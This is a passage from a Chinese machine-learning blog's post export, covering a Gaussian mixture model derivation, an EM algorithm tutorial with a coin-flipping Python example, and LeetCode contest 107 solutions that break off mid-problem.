\\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}\\\\ &amp;= \\sum_{i=1}^N \\frac{\\alpha_k \\left( -\\frac{1}{\\sqrt{2\\pi}\\sigma_k^2}\\exp(-\\frac{(x_i-\\mu_k)^2}{2\\sigma_k^2}) + \\frac{1}{\\sqrt{2\\pi} \\sigma_k} \\exp(-\\frac{(x_i-\\mu_k)^2}{2\\sigma_k^2})\\frac{(x_i-\\mu_k)^2}{2\\sigma_k^4} 2\\sigma_k\\right)}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}\\\\ &amp;= \\sum_{i=1}^N \\frac{\\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k)\\left( -\\frac{1}{\\sigma_k}+ \\frac{(x_i-\\mu_k)^2}{\\sigma_k^3} \\right)}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}\\\\ &amp;= \\sum_{i=1}^N \\gamma(z_{ik})\\left( -\\frac{1}{\\sigma_k}+ \\frac{(x_i-\\mu_k)^2}{\\sigma_k^3} \\right) = 0 \\end{align*} \\] 令其导数为0，有 \\[ \\sigma_k^2 = \\frac{\\sum_{i=1}^N \\gamma({z_{ik}})(x_i-\\mu_k)^2}{\\sum_{i=1}^N\\gamma({z_{ik}})} \\] 由于\\(\\sum_k \\alpha_k = 1\\)，这是有约束条件的，所以需要引入拉格朗日算子然后在对\\(\\alpha_k\\)求偏导： \\[ \\begin{align*} l_2 &amp;= \\sum_{i=1}^N \\log \\left(\\sum_{k=1}^K \\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k) \\right) + \\sum_{k=1}^K\\lambda_k (\\alpha_k - 1)\\\\ \\frac{\\partial l_2}{\\partial \\alpha_k} &amp;= \\sum_{i=1}^N \\frac{ \\mathcal{N}({x}_k\\mid{\\mu}_k,{\\sigma}_k)}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)} + \\lambda= 0 \\end{align*} \\] 两边同乘以\\(\\alpha_k\\)得到： \\[ \\sum_{i=1}^N \\frac{ \\alpha_k\\mathcal{N}({x}_k\\mid{\\mu}_k,{\\sigma}_k)}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}+\\lambda \\alpha_k = 0\\\\ \\sum_{i=1}^N\\gamma(z_{ik}) = -\\lambda a_k \\] 这里有个技巧就是对k求和，有 \\[ \\begin{align*}\\sum_{k=1}^ K\\sum_{i=1}^N \\gamma(z_{ik}) &amp;= \\sum_{i=1}^N \\frac{ \\sum_{k=1}^{K} \\alpha_k\\mathcal{N}({x}_k\\mid{\\mu}_k,{\\sigma}_k)}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)} \\\\ &amp;= N \\\\ &amp;= -\\lambda \\sum_{k=1}^K a_k\\\\ &amp;= -\\lambda \\end{align*} \\] 因此，有 \\[ \\alpha_k = \\frac{\\sum_{i=1}^N \\gamma(z_{ik})}{N} \\] 小结 GMM模型采用EM算法进行求解，步骤如下： 设定K的值，随机初始化K个高斯分布的参数\\(\\alpha_k, \\mu_k, \\sigma_k\\) E-step，根据当前的\\(\\alpha_k\\)计算后验概率\\(\\hat\\gamma(z_{ik})\\) \\[ \\begin{align*} \\hat\\gamma(z_{ik}) = P(z_k=1\\mid x_i) &amp;= \\frac{\\alpha_k \\mathcal{N}({\\bf x_i}\\mid{\\mu}_k,{\\bf \\Sigma}_k)}{\\sum_{j=1}^K\\alpha_j \\mathcal{N}({\\bf x_i}\\mid{\\mu}_j,{\\bf \\Sigma}_j)} \\end{align*} \\] M-step, 根据E-step中计算的\\(\\gamma(z_{ik})\\)再计算新的\\(\\hat\\alpha_k, \\hat\\mu_k, \\hat\\sigma_k\\) \\[ \\begin{align*} \\hat \\mu_k &amp;= \\frac{\\sum_{i=1}^N \\hat\\gamma(z_{ik})\\ x_i}{\\sum_{i=1}^N \\gamma(z_{ik})}\\\\ \\hat \\sigma_k^2 &amp;= \\frac{\\sum_{i=1}^N \\hat\\gamma({z_{ik}})(x_i-\\mu_k)^2}{\\sum_{i=1}^N\\hat\\gamma({z_{ik}})}\\\\ \\hat\\alpha_k &amp;= \\frac{\\sum_{i=1}^N \\hat\\gamma(z_{ik})}{N} \\end{align*} \\] 计算对数似然函数\\(\\sum_{i=1}^N \\log \\left(\\sum_{k=1}^K \\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k) \\right)\\)，看是否收敛，若不收敛，返回2步 参考资料 [1] 《百面机器学习》 [2]高斯混合模型（GMM）及其EM算法的理解 https://brilliant.org/wiki/gaussian-mixture-model/ https://www.geeksforgeeks.org/gaussian-mixture-model/ https://blog.csdn.net/lpsl1882/article/details/53072907","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』EM算法","slug":"machine-learning-em-algorithm","date":"2018-12-01T03:39:41.000Z","updated":"2020-10-21T15:05:08.466Z","comments":true,"path":"machine-learning-em-algorithm/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-em-algorithm/","excerpt":"EM算法即期望最大化算法(Expectation-Maximum）算法，它用于含有因变量的概率模型参数的极大似然估计，或极大后验估计。很多机器学习算法采用它进行求解，如高斯混合模型、LDA主题模型的变分推断等。","text":"EM算法即期望最大化算法(Expectation-Maximum）算法，它用于含有因变量的概率模型参数的极大似然估计，或极大后验估计。很多机器学习算法采用它进行求解，如高斯混合模型、LDA主题模型的变分推断等。 EM算法的引入 下面的例子来自[1]。 极大似然估计 假设有两枚硬币A和B，每次选一个硬币来抛10次。现在已经进行了5轮（也就是选了5次硬币，并分别抛了10次）结果如下（H表示正面，T表示反面）： em-algorithm-maximum-likelihood 现在要求抛一次硬币A和硬币B正面朝上的概率（已知选的是A或者B硬币，求正面的概率），则我们可以简单的用极大似然估计来求解： 以硬币A的概率为例，抛硬币结果满足二项分布，可以写出似然函数： \\[ \\begin{align*} L &amp;= \\prod_{i=1}^{30}{\\hat P_A}^{y_i}({1 -\\hat P_A})^{(1- y_i)} \\\\ &amp;= \\hat{P_A}^{24}({1 -\\hat{P_A} })^{6} \\end{align*} \\] 令其倒数为0，则有 \\[ \\frac{\\partial L}{\\partial \\hat P_A} = 24{P_A}^{23}({1 -\\hat{P_A} })^{6} - 6{P_A}^{24}({1 -\\hat{P_A} })^{5}= 0\\\\ \\] 可得\\(\\hat{P_A} = \\frac{4}{5} = 0.80\\)，这和我们直觉的计算是一样的，同理可以计算\\(\\hat{P_B}\\)： \\[ \\hat P_A = \\frac{24}{24 + 6} = 0.80\\\\ \\hat P_B = \\frac{9}{9 + 11} = 0.45 \\] EM 算法 现在让例子更复杂一点，假设我们每一轮不知道选的是硬币A还是硬币B，只知道每一轮10次的结果： 硬币 正面数 反面数 ？ 5 5 ？ 9 1 ？ 8 2 ？ 4 6 ？ 7 3 现在仍然要求抛一次硬币A和硬币B正面的概率，怎么做呢？ 这个时候相当于有隐变量 \\(\\{\\bf z_1, z_2, z_3, z_4, z_5\\}\\)，控制着我们每一轮抛硬币的时候是选择硬币A还是硬币B，比如\\(\\bf z_1\\)代表第一轮投掷的时候使用硬币是A还是B。但是这个隐变量\\({\\bf z}\\)我们是不知道的，也就无法用极大似然估计法来估计\\(\\hat P_A\\)和\\(\\hat P_B\\)。然而如果我们要估计隐变量\\({\\bf z}\\)，那么我们又需要知道\\(\\hat P_A\\)和\\(\\hat P_B\\)。这使得这个问题进入了死循环，因为我们既不知道隐变量\\(\\bf z\\), 也不知道\\(\\hat P_A\\)和\\(\\hat P_B\\)。 这时候EM算法就出来救场啦。EM算法的步骤如下： 随机初始化\\(\\hat P_A^{(0)}\\)和\\(\\hat P_B^{(0)}\\) 用\\(\\hat P_A^{(0)}\\)和\\(\\hat P_B^{(0)}\\)估计隐变量\\(\\bf z\\) 根据估计出的隐变量\\(\\bf z\\)来估计\\(\\hat P_A^{(1)}\\)和\\(\\hat P_B^{(1)}\\) 重复2-3步直到P不再变化或变化较小 现在我们来尝试手工计算一下，假设我们初始化\\(\\hat P_A^{(0)} = 0.60\\)和\\(\\hat P_B^{(0)}= 0.50\\)，现在来用极大似然法估计隐变量\\(\\bf z\\)。 对于第一轮，如果是硬币A，可以计算出生成的概率为\\(a = 0.6^5(1-0.6)^5=0.0007962624\\), ，同理得如果是硬币B\\(b = 0.5^5(1-0.5)^5=0.0009765625\\)，这个值越大，说明越有可能使用该硬币。 则使用硬币A的概率为\\(a / (a + b) = 0.45\\), 使用硬币B的概率为\\(b / (a + b) = 0.55\\)。 接着根据估计出的隐变量\\(\\bf z\\)来估计\\(\\hat P_A^{(1)}\\)和\\(\\hat P_B^{(1)}\\)：我们来计算一下以0.45的概率选择硬币A，0.55的概率选择硬币B时，5个为正的结果中有\\(0.45 * 5 = 2.25\\)是A“产生\"的，有\\(0.55 * 5 = 2.75\\)个是B”产生\"的。以此类推，可以得到下面的表格： 选择A的概率 A的正面贡献 A的反面贡献 选择B的概率 B的正面贡献 B的反面贡献 0.45 2.25 2.25 0.55 2.75 2.75 0.80 7.24 0.8 0.20 1.76 0.20 0.73 5.87 1.47 0.27 2.13 0.53 0.35 1.41 2.11 0.65 2.59 3.89 0.65 4.53 1.94 0.35 2.47 1.06 统计得到：A总共有21.3次正面，8.6次反面，B有11.7次正面，8.4次反面，因此更新新的概率 \\[ \\hat P_A^{(1)} = \\frac{21.3}{21.3+8.6} \\approx 0.71\\\\ \\hat P_B^{(1)} = \\frac{11.7}{11.7+8.4} \\approx 0.58 \\] 重复上面的过程，到第10次的时候收敛有: \\[ \\hat P_A^{(10)} \\approx 0.80\\\\ \\hat P_B^{(10)} \\approx 0.52 \\] 用下面的代码来计算表示: 1234567891011121314151617181920212223242526272829303132333435363738394041class EMSolve(object): def __init__(self, pa, pb, max_round=100): self.heads_cnt = [5, 9, 8, 4, 7] # 正面次数 self.round_num = 10 self.pa = pa self.pb = pb self.max_round = max_round def e_step(self): a_cnt = [] b_cnt = [] for pos_cnt in self.heads_cnt: likelihood_a = (self.pa ** pos_cnt) * ((1 - self.pa) ** (self.round_num - pos_cnt)) likelihood_b = (self.pb ** pos_cnt) * ((1 - self.pb) ** (self.round_num - pos_cnt)) choose_a = likelihood_a / (likelihood_a + likelihood_b) choose_b = likelihood_b / (likelihood_a + likelihood_b) a_cnt.append([choose_a * pos_cnt, choose_a * (self.round_num - pos_cnt)]) b_cnt.append([choose_b * pos_cnt, choose_b * (self.round_num - pos_cnt)]) # print(&#x27;a: &#x27;, round(choose_a, 2), round(a_cnt[-1][0], 2), round(a_cnt[-1][1], 2), &#x27;\\tb:&#x27;, round(choose_b, 2), round(b_cnt[-1][0], 2), round(b_cnt[-1][1], 2)) return a_cnt, b_cnt def m_step(self, a_cnt, b_cnt): total_a = sum(sum(x) for x in a_cnt) new_a = sum(x[0] for x in a_cnt) / total_a total_b = sum(sum(x) for x in b_cnt) new_b = sum(x[0] for x in b_cnt) / total_b return new_a, new_b def start(self): for epoch in range(self.max_round): a_cnt, b_cnt = self.e_step() new_pa, new_pb = self.m_step(a_cnt, b_cnt) print(epoch, new_pa, new_pb) if abs(new_pa - self.pa) &lt; 1e-4 and abs(new_pb - self.pb) &lt; 1e-4: break self.pa, self.pb = new_pa, new_pbif __name__ == &#x27;__main__&#x27;: EMSolve(pa=0.6, pb=0.5).start() 那么，上面的做法的理论依据是什么呢？是不是一定能收敛到最优解呢？请继续往下阅读。 数学基础 首先来介绍一点之后要用到的数学基础。 凸函数 Convex functions 凸函数的数学定义为：在某个向量空间的凸子集C上的实值函数\\(f\\)，如果在其定义域\\(C\\)上的任意两点\\(x_1,x_2\\)以及\\(\\lambda \\in [0,1]\\)，有 \\[ f(\\lambda x_1+(1-\\lambda )x_2) \\le \\lambda f(x_1) + (1-\\lambda )f(x_2)\\tag{2-1} \\] 如果对于任意的\\(\\lambda \\in (0,1)\\)，有\\(f(\\lambda x_1+(1-\\lambda )x_2) \\lt \\lambda f(x_1) + (1-\\lambda )f(x_2)\\),则称\\(f\\)是严格凸的。 上面的定义说明凸函数任意两点的连线位于图形的上方。 em-algorithm-convex-function 此外，假设\\(f\\)是二阶可微，函数\\(f\\)是凸函数的充要条件是：\\(f&#39;&#39;(x) \\ge 0\\)。当\\(\\bf x\\)是向量的时候，如果其hessian矩阵H是半正定的，\\(H \\ge 0\\)，那么\\(f\\)是凸函数。如果\\(f&#39;&#39;(x)\\)或者说\\(H \\gt 0\\)，那么称\\(f\\)是严格凸函数。关于hessian矩阵是半正定的证明，可以参考知乎怎么理解二阶偏导与凸函数的Hessian矩阵是半正定的？ Jensen不等式 Jensen是式2-1的泛化形式，或者说2-1是Jensen不等式的两点形式。 若对于任意点集\\({x_i}\\),若\\(\\lambda_i \\ge 0\\)且\\(\\sum_i \\lambda_i=1\\)，使用数学归纳法可以证明凸函数\\(f(x)\\)满足: \\[ f\\left(\\sum_{i=1}^N\\lambda_ix_i\\right) \\le \\sum_{i=1}^N \\lambda_if(x_i) \\tag{2-2} \\] 式2-2就称为Jensen不等式。 在概率论中，如果把\\(\\lambda_i\\)看成取值为\\(x_i\\)的离散变量x的概率分布，那么公式2-2就可以写为： \\[ f(E[x]) \\le E[f(x)] \\tag{2-3} \\] 参考：如何理解Jensen不等式？ - 青崖白鹿记的回答 - 知乎 凹函数 凹函数和上面的凸函数结论是相反的，比如Jensen不等式则为： \\[ \\begin{align*} f\\left(\\sum_{i=1}^N\\lambda_ix_i\\right) &amp;\\ge \\sum_{i=1}^N \\lambda_if(x_i) \\tag{2-4}\\\\ f(E[x]) &amp;\\ge E[f(x)] \\tag{2-5} \\end{align*} \\] EM算法 现在我们来讲解EM算法。 假设我们有N个独立的数据，\\(\\{x_1, \\cdots x_N\\}\\)，我们想找到每个样本找到隐含的类别参数\\(z\\)，使得\\(p(x,z)\\)最大，其对数似然函数如下： \\[ \\begin{align*} l(\\theta) &amp;= \\sum_{i=1}^N\\log p(x_i ; \\theta)\\\\ &amp;=\\sum_{i=1}^N \\log \\sum_{z_i} p(x_i,z_i ; \\theta)\\tag{3-1} \\end{align*} \\] 注意这里的符号： 写分号p(x; theta)表示待估参数（是固定的，只是当前未知）,应该可以直接认为是p(x) from https://blog.csdn.net/pipisorry/article/details/42715245 前面提到过，由于隐变量\\(z\\)的存在，使得我们难以求解\\(\\theta\\)。为此，EM的做法是不断的构造\\(l(\\theta)\\)的下界(E-step)，然后优化下界(M-step)。 具体的做法是，对于每个样本i， 令\\(Q_i\\)表示该样本隐含变量\\(z\\)的分布（比如上面的抛硬币案例，则指伯努利分布），\\(Q_i\\)满足\\(\\sum_z Q_i(z) = 1,\\ Q_i(z) \\ge 0\\)。可得： \\[ \\begin{align*} l(\\theta) = \\sum_i \\log p(x_i\\mid \\theta) &amp;= \\sum_i \\log \\sum_{z_i} p(x_i, z_iZ; \\theta)\\\\ &amp;= \\sum_i \\log \\sum_{z_i} Q_i(z_i) \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)}\\\\ &amp;\\ge \\sum_i \\sum_{z_i}Q_i(z_i) \\log \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)} \\tag{3-2} \\end{align*} \\] 最后一步是用Jensen不等式得到的， \\[ \\sum_{z_i} Q_i(z_i) \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)} \\] 其实是\\({p(x_i, z_i; \\theta)}/{Q_i(z_i)}\\)的期望，而\\(\\log\\)函数是凹函数，根据Jensen不等式，有： \\[ f\\left(E_{z_i\\sim Q_i}\\left[\\frac{ {p(x_i, z_i; \\theta)} }{Q_i(z_i)}\\right]\\right) \\ge E_{z_i \\sim Q_i} \\left[ f\\left( \\frac{ {p(x_i, z_i; \\theta)} }{Q_i(z_i)} \\right)\\right] \\] 这样，对于任意的分布\\(Q_i\\)，式3-2求得了\\(l(\\theta)\\) 的下界，但是\\(Q_i\\)分布怎么选择呢？在很多种可能中如何选择最好的？假设已经知道了\\(\\theta\\)，那么只需要最大化3-2，使得下界逼近\\(l(\\theta)\\)即可。观察3-2，很容易发现，当3-2取等号的时候，说明下界达到了最大。而要取等号，根据Jensen不等式，需要让随机变量的值为常数，因此，我们有如下的约束： \\[ \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)} = c \\tag{3-3} \\] 这里的c是一个不依赖于\\(z_i\\)的常数。我们继续进行推导，由于\\(Q_i\\)函数满足\\(\\sum_z Q_i(z) = 1\\)，那么有\\(\\sum_z p(x_i, z_i; \\theta) = \\sum_z cQ_i(z_i) = c\\)，带入3-3可得: \\[ \\begin{align*} Q_i(z_i) &amp;= \\frac{p(x_i, z_i; \\theta)}{\\sum_z p(x_i, z_i; \\theta)} \\\\ &amp;= \\frac{p(x_i, z_i; \\theta)}{p(x_i;\\theta)} \\\\ &amp; = p(z_i \\mid x_i;\\theta) \\tag{3-4} \\end{align*} \\] 于是得到\\(Q_i\\)就是后验概率分布\\(p(z_i | x_i;\\theta)\\)。因此3-2的式子通过对数似然函数给定了\\(l(\\theta)\\) 的下界，这个下界是我们想要去最大化的，这一步称为E步（E-step）。 接着是M步，最大化式3-2，也就是最大化\\(l(\\theta)\\) 的下界（固定了\\(Q_i(z_i)\\)后，调整下界），于是得到EM算法的步骤为： Random initialization \\(\\theta\\) repeat until convergence { ​ (E-step) For each i, set ​ \\(Q_i(z_i) = p(z_i \\mid x_i; \\theta)\\) ​ (M-step) Set ​ \\(\\theta = \\arg \\max_\\theta Q_i(z_i) = \\sum_i \\sum_{z_i}Q_i(z_i) \\log \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)}\\) } 上面EM算法中，我们不断的进行E-step和M-step的迭代，直到收敛。那么，算法真的会收敛么？下面来证明一下。 收敛性证明 设\\(\\theta^{(t)}\\)和\\(\\theta^{(t+1)}\\)是第t轮和第t + 1轮迭代的结果，我们只需要证明\\(l(\\theta^{(t)}) \\le l(\\theta^{(t + 1)})\\)就说明EM算法总是使得对数似然不断的增大，那么最终就会达到最大值。 根据3-2，有： \\[ l(\\theta^{(t)}) = \\sum_i \\sum_{z_i}Q_i^{(t)}(z_i) \\log \\frac{p(x_i, z_i; \\theta^{(t)})}{Q_i^{(t)}(z_i)}\\tag{3-5} \\] 而参数\\(\\theta^{(t+1)}\\)是通过最大化式3-5的，因此 \\[ \\begin{align*} l(\\theta^{(t + 1)}) &amp;\\ge \\sum_i \\sum_{z_i}Q_i^{(t)}(z_i) \\log \\frac{p(x_i, z_i; \\theta^{(t+1)})}{Q_i^{(t)}(z_i)}\\tag{3-6} \\\\ &amp;\\ge \\sum_i \\sum_{z_i}Q_i^{(t)}(z_i) \\log \\frac{p(x_i, z_i; \\theta^{(t)})}{Q_i^{(t)}(z_i)}\\tag{3-7} \\\\ &amp;=l(\\theta^{(t)})\\tag{3-8} \\end{align*} \\] 3-6的式子是因为式3-2，对于任意的分布\\(Q_i\\)，均有 \\[ \\begin{align*} l(\\theta) &amp;\\ge \\sum_i \\sum_{z_i}Q_i(z_i) \\log \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)} \\end{align*} \\] 而3-7是因为我们M-step后，得到的\\(\\theta^{(t+1)}\\)采用的是: \\[ \\arg \\max_\\theta \\sum_i \\sum_{z_i}Q_i(z_i) \\log \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)} \\] 因此，有3-7成立，而3-8就是式子3-5。 如果定义 \\[ g(Q, \\theta) = \\sum_{z_i}Q_i(z_i) \\log \\frac{p(x_i, z_i; \\theta)}{Q_i(z_i)}\\tag{3-9} \\] 我们知道有\\(l(\\theta) \\ge g(Q, \\theta)\\)。EM算法可以理解为对\\(g(Q, \\theta)\\)运用坐标轴上升法，E-step固定\\(\\theta\\)来优化\\(Q\\)，使得下界g在\\(\\theta\\)处与\\(l(\\theta)\\)相等，而M-step固定\\(Q\\)来优化\\(\\theta\\)，求使得下界\\(g(Q, \\theta)\\)达到最大值的\\(\\theta\\)，从而使得\\(l(\\theta)\\)的值也变大。下图直观的反应了这一过程。 em-algorithm-process 回顾硬币例子 在前面的硬币例子中，我们首先做的是随机初始化概率\\(\\hat P_A, \\hat P_B\\)。 然后是E-step：估计后验概率\\(P({\\bf z_i} \\mid x_i)\\)，这里的隐变量\\(z_i = \\{z_{iA}, z_{iB} \\}\\)。可以理解为若\\(z_{iA} = 1\\)则说明第i个样本为硬币A产生，若\\(z_{iB}=1\\)则说明第i个样本为硬币B产生。 分别计算硬币可能由A和B的似然值a和b，然后计算\\(P(z_{iA}=1\\mid x_i) = a_i / (a_i+ b_i)\\)和\\(\\ P(z_{iB} = 1\\mid x_i) = b_i / (a_i+ b_i)\\)。 接着是M-step：根据每个样本估计出是属于哪一个硬币的结果\\(z_{iA}\\)和\\(z_{iB}\\)，计算出新的概率\\(P_A, P_B\\) EM算法最优解 EM算法不能保证找到全局最优解，只能保证收敛到对数似然函数的稳定点，不能保证收敛到极大值点。所以在应用中初始值的选择十分重要，常用的办法是选取几个不同的初值进行迭代，然后对得到的各个估计值加以比较，从中选择最好的。 参考资料 [1] Do C B, Batzoglou S. What is the expectation maximization algorithm?[J]. Nature biotechnology, 2008, 26(8): 897. [2] The EM algorithm， CS229 Lecture notes Part IX [3] （EM算法）The EM Algorithm","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"machine learning math","slug":"machine-learning-math","permalink":"https://www.hrwhisper.me/tags/machine-learning-math/"}]},{"title":"leetcode contest 107 solution","slug":"leetcode-contest-107-solution","date":"2018-10-21T04:35:18.000Z","updated":"2021-01-08T13:15:43.624Z","comments":true,"path":"leetcode-contest-107-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-107-solution/","excerpt":"本文是leetcode contest 107的题解: 925. Long Pressed Name 926. Flip String to Monotone Increasing 927. Three Equal Parts 928. Minimize Malware Spread II","text":"本文是leetcode contest 107的题解: 925. Long Pressed Name 926. Flip String to Monotone Increasing 927. Three Equal Parts 928. Minimize Malware Spread II 925. Long Pressed Name Your friend is typing his name into a keyboard. Sometimes, when typing a character c, the key might get long pressed, and the character will be typed 1 or more times. You examine the typed characters of the keyboard. Return True if it is possible that it was your friends name, with some characters (possibly none) being long pressed. Example 1: Input: name = \"alex\", typed = \"aaleex\" Output: true Explanation: 'a' and 'e' in 'alex' were long pressed. Example 2: Input: name = \"saeed\", typed = \"ssaaedd\" Output: false Explanation: 'e' must have been pressed twice, but it wasn't in the typed output. Example 3: Input: name = \"leelee\", typed = \"lleeelee\" Output: true Example 4: Input: name = \"laiden\", typed = \"laiden\" Output: true Explanation: It's not necessary to long press any character. Note: name.length &lt;= 1000 typed.length &lt;= 1000 The characters of name and typed are lowercase letters. 题目地址：leetcode Long Pressed Name 题目大意：给定一个name和一个typed的字符串，判断typed是否是由name中重复一些字母得到的 思路： 直接比较即可。。。遇到不相等的看typed[i] 是否等于name[j - 1] Python 12345678910111213141516171819class Solution(object): def isLongPressedName(self, name, typed): &quot;&quot;&quot; :type name: str :type typed: str :rtype: bool &quot;&quot;&quot; if not name: return not typed i = j = 0 while i &lt; len(typed) and j &lt; len(name): if name[j] == typed[i]: i += 1 j += 1 else: if j &gt; 0 and typed[i] == name[j - 1]: i += 1 else: return False return j == len(name) 926. Flip String to Monotone Increasing A string of '0's and '1's is monotone increasing if it consists of some number of '0's (possibly 0), followed by some number of '1's (also possibly 0.) We are given a string S of '0's and '1's, and we may flip any '0' to a '1' or a '1' to a '0'. Return the minimum number of flips to make S monotone increasing. Example 1: Input: \"00110\" Output: 1 Explanation: We flip the last digit to get 00111. Example 2: Input: \"010110\" Output: 2 Explanation: We flip to get 011111, or alternatively 000111. Example 3: Input: \"00011000\" Output: 2 Explanation: We flip to get 00000000. Note: 1 &lt;= S.length &lt;= 20000 S only consists of '0' and '1' characters. 题目地址：leetcode Flip String to Monotone Increasing 题目大意：给定只由0和1组成的字符串，让你替换一些字符，使得字符串是单调上升的，即0000111这样，问最少替换几个字符。 思路： 双状态DP，设one[i]以1结尾的上升字符串最少替换次数，zero[i]为以0结尾的单调上升字符串的最少替换次数 则s[i] == '0'： one[i] = min(one[i - 1] ,zero [i - 1]) + 1 即要替换当前的为1 zero[i] = zero[i - 1] s[i] == '1': one[i] = min(one[i - 1], zero[i - 1]) #不用替换 zero[i] = zero[i - 1] + 1 # 替换为0 Python 123456789101112131415161718192021class Solution(object): def minFlipsMonoIncr(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; if not s: return 0 one, zero = [0] * len(s), [0] * len(s) if s[0] == &#x27;0&#x27;: one[0] = 1 else: zero[0] = 1 for i in range(1, len(s)): if s[i] == &#x27;0&#x27;: one[i] = min(one[i - 1], zero[i - 1]) + 1 zero[i] = zero[i - 1] else: # s[i] is &#x27;1&#x27; one[i] = min(one[i - 1], zero[i - 1]) zero[i] = zero[i - 1] + 1 return min(zero[-1], one[-1]) 927. Three Equal Parts Given an array A of 0s and 1s, divide the array into 3 non-empty parts such that all of these parts represent the same binary value. If it is possible, return any [i, j] with i+1 &lt; j, such that: A[0], A[1], ..., A[i] is the first part; A[i+1], A[i+2], ..., A[j-1] is the second part, and A[j], A[j+1], ..., A[A.length - 1] is the third part. All three parts have equal binary value. If it is not possible, return [-1, -1]. Note that the entire part is used when considering what binary value it represents. For example, [1,1,0] represents 6 in decimal, not 3. Also, leading zeros are allowed, so [0,1,1] and [1,1] represent the same value. Example 1: Input: [1,0,1,0,1] Output: [0,3] Example 2: Input: [1,1,0,1,1] Output: [-1,-1] Note: 3 &lt;= A.length &lt;= 30000 A[i] == 0 or A[i] == 1 题目地址：leetcode Three Equal Parts 题目大意：给定只由0和1组成的数组，求两个下标[i, j]使得这个下标将数组划分为3个部分，每个部分的二进制相等。 思路：这题的难点在于在哪里划分，因为有前导0比如[0,1,1]和[1,1]代表同一个二进制值。一个trick是只需要根据1划分就可以了。因为最后不管怎么划分，1的个数必然相等，也不用管最前面有几个0. 因此，首先统计1的个数，然后看其是否能被3整除。 然后设target = total_ones / 3，这样每部分需要的1的个数就确定了。 接着，设一分点为first[0], first[1]，分别代表下标从first[0]到first[1]的位置中，1的个数都为target 设二分点为second[0], second[1]，分别代表下标从second[0]到second[1]的位置中，1的个数都为target * 2 其实也就是说明first[0] + 1...first[1]中都是0，这些0可能是第一部分也可能是第二部分的。 同理second[0] + 1....second[1]都是0，这些0可能是第二部分也可能是第三部分的。 这里可以用一个trick是划分后必然有他们的尾部是相等的，可以从最后一部分开始往前推。 可以计算出最后尾部有多少个0，设为need_zero。那么second[0] + need_zero则为第二部分的结尾，first[0] + need_zero则为第一部分的结尾。 最后判断三个部分是否相等即可。 Python 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Solution(object): def is_equal(self, A, s1, e1, s2, e2): i = e1 j = e2 while i &gt;= s1 and j &gt;= s2: if A[i] != A[j]: return False i -= 1 j -= 1 return True def threeEqualParts(self, A): &quot;&quot;&quot; :type A: List[int] :rtype: List[int] &quot;&quot;&quot; if len(A) &lt; 3: return False cnt = [0] * len(A) cnt[0] = 1 if A[0] == 1 else 0 for i in range(1, len(A)): cnt[i] = cnt[i - 1] + (A[i] == 1) if cnt[-1] % 3 != 0: return [-1, -1] if cnt[-1] == 0: return [0, len(A) - 1] target = cnt[-1] // 3 first = [] second = [] for i in range(len(A)): if cnt[i] == target: if not first: first = [i, i] else: first[1] = i elif cnt[i] == target &lt;&lt; 1: if not second: second = [i, i] else: second[1] = i j = len(A) - 1 while A[j] == 0: j -= 1 need_zero = len(A) - j - 1 ans = [-1, -1] if second[1] - second[0] + 1 &lt; need_zero or first[1] - first[0] + 1 &lt; need_zero: return ans ans[1] = second[0] + need_zero ans[0] = first[0] + need_zero if self.is_equal(A, 0, ans[0], ans[0] + 1, ans[1]) and \\ self.is_equal(A, 0, ans[0], ans[1] + 1, len(A) - 1): return [ans[0], ans[1] + 1] return [-1, -1] 928. Minimize Malware Spread II (This problem is the same as Minimize Malware Spread, with the differences bolded.) In a network of nodes, each node i is directly connected to another node j if and only if graph[i][j] = 1. Some nodes initial are initially infected by malware. Whenever two nodes are directly connected and at least one of those two nodes is infected by malware, both nodes will be infected by malware. This spread of malware will continue until no more nodes can be infected in this manner. Suppose M(initial) is the final number of nodes infected with malware in the entire network, after the spread of malware stops. We will remove one node from the initial list, completely removing it and any connections from this node to any other node. Return the node that if removed, would minimize M(initial). If multiple nodes could be removed to minimize M(initial), return such a node with the smallest index. Example 1: Input: graph = [[1,1,0],[1,1,0],[0,0,1]], initial = [0,1] Output: 0 Example 2: Input: graph = [[1,1,0],[1,1,1],[0,1,1]], initial = [0,1] Output: 1 Example 3: Input: graph = [[1,1,0,0],[1,1,1,0],[0,1,1,1],[0,0,1,1]], initial = [0,1] Output: 1 Note: 1 &lt; graph.length = graph[0].length &lt;= 300 0 